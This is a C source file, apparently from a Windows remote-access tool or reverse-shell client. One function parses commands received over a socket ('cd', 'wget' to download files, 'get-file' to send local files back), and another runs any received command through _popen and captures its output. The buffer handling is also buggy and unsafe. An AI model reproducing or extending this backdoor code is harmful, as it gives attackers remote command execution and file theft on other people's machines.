#include "main.h"

int process_command(struct main_struct *m_s)
{
	if(my_strcmp(m_s->cmd, "exit\n")) {
		m_s->cn = SOCKET_ERROR;
	} else if((m_s->cmd[0] == 'c') && (m_s->cmd[1] == 'd') &&
			(m_s->cmd[2] == ' ')) {
		cd(m_s->cmd);
		sender(m_s->s, " ", 2, &m_s->cn);
	} else if(m_s->cmd[0] == 'w' && m_s->cmd[1] == 'g' && m_s->cmd[2] == 'e'
			&& m_s->cmd[3] == 't' && m_s->cmd[4] == ' ') {
		wget(m_s->cmd);
		sender(m_s->s, "File Downloaded", 16, &m_s->cn);
	} else if(m_s->cmd[0] == 'g' && m_s->cmd[1] == 'e' && m_s->cmd[2] == 't'
			&& m_s->cmd[3] == '-' && m_s->cmd[4] == 'f' && m_s->cmd[5] == 'i'
			&& m_s->cmd[6] == 'l' && m_s->cmd[7] == 'e' && m_s->cmd[8] == ' ') {
		if(get_file(m_s->cmd,m_s->s) < 0) {
			sender(m_s->s, "-1", 3, &m_s->cn);
		}
	}
	return 0;
}

int exe(struct main_struct *m_s)
{
	FILE *cmd_f = _popen(m_s->cmd, "r");
	char ch;
	char *temp;
	int i, size, done;

	done = 0;
	ch = 1;
	size = 1024;
	if(cmd_f == NULL) {
		m_s->buf = malloc((23+strlen(m_s->cmd)) * sizeof(char));
		sprintf(m_s->buf, "[Err]Command %s : not found!\n", m_s->cmd);
	} else {
		i = 0;
		do {
			m_s->buf = malloc(size * sizeof(char));
			if (size > 1024 && m_s->buf != NULL){
				my_strcpy(m_s->buf, temp, strlen(temp));
				free(temp);
			}
			temp = malloc(size * sizeof(char));
			if(m_s->buf == NULL || temp == NULL)
				return -1;
			while(((ch = fgetc(cmd_f)) != EOF) && i <= (size-1)) {
				m_s->buf[i] = ch;
				i++;
			}
			if((ch != EOF) && i <= size){
				my_strcpy(temp, m_s->buf, strlen(m_s->buf));
				size *= 2;
				free(m_s->buf);
			} else {
				m_s->buf[i] = '\0';
				done = 1;
			}
		} while (!done);
	}
	_pclose(cmd_f);
	return 0;
}
